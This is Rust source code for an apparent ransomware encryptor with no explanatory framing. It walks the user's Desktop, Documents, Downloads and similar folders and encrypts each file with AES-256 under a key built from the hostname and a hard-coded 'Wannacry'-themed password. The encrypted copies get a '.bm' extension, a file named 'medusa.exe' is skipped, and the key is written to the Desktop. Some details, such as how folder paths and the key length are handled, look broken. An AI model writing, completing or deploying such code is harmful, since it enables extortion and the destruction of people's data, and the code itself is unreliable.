use std::fs;
use openssl::symm::{Cipher, encrypt};
use whoami;

fn main() {
    // List of folders to navigate
    let folders = vec![
        "Desktop", "Documents", "Downloads", "Music", "Pictures", "Public", "Templates", "Videos"
    ];

    // Get the user's system name
    let system_name = whoami::hostname();

    // Additional password
    let additional_password = "WannacrywithBM&*^%$$$%^))(!@#";

    // Generate encryption key
    let mut encryption_key = system_name.clone();
    encryption_key.push_str(additional_password);

    // AES-256 encryption cipher
    let cipher = Cipher::aes_256_cbc();

    // Iterate over folders
    for folder in folders {
        // Construct folder path
        let desktop_path = dirs::desktop_dir().expect("Failed to get Desktop path");
        let folder_path = desktop_path.join(&folder);

        // Check if folder exists
        if folder_path.exists() {
            println!("Encrypting files in {}...", folder);

            // Iterate over files in the folder
            if let Ok(entries) = fs::read_dir(&folder_path) {
                for entry in entries {
                    if let Ok(entry) = entry {
                        let file_path = entry.path();
                        
                        // Check if it's a file
                        if file_path.is_file() {
                            // Skip specific file(s)
                            let file_name = file_path.file_name().unwrap().to_string_lossy();
                            if file_name == "medusa.exe" {
                                println!("Skipping encryption for {}", file_name);
                                continue;
                            }

                            // Read file content
                            let file_content = fs::read(&file_path).expect("Failed to read file");

                            // Encrypt file content
                            let encrypted_content = encrypt(cipher, &encryption_key.as_bytes(), None, &file_content)
                                .expect("Encryption failed");

                            // Change file extension to .bm
                            let new_file_path = file_path.with_extension("bm");

                            // Write encrypted content to new file
                            fs::write(new_file_path, encrypted_content).expect("Failed to write encrypted file");
                        }
                    }
                }
            }
        }
    }

    // Save encryption key to Desktop
    let desktop_path = dirs::desktop_dir().expect("Failed to get Desktop path");
    let key_file_path = desktop_path.join("encryptor.key");
    fs::write(&key_file_path, encryption_key).expect("Failed to write encryption key");

    println!("Encryption complete!");
}

